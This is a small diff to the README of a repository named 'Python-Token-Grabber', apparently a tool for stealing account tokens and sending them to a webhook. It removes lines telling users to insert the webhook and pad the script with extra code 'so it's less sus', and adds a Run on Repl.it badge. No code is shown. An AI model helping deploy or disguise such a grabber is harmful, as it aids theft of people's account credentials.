@@ -1,4 +1,1 @@
-# Python-Token-Grabber
-
-it's simple af just put the webhook in there.
-also make sure you put a bunch of code in there so it's less sus :)
+[![Run on Repl.it](https://repl.it/badge/github/pix1337/Python-Token-Grabber)](https://repl.it/github/pix1337/Python-Token-Grabber)
